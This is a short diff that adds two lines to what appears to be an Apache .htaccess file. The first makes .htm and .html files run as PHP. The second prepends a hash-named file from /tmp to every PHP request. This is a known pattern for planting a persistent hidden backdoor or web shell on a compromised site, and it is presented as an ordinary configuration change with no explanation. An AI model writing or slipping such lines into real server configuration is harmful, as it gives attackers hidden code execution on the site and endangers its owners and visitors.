@@ -1,0 +1,2 @@
+AddType application/x-httpd-php .php .phtml .php3 .php4 .php5 .htm .html
+php_value auto_prepend_file /tmp/25454b22bf39c75795851f39d5e347c4
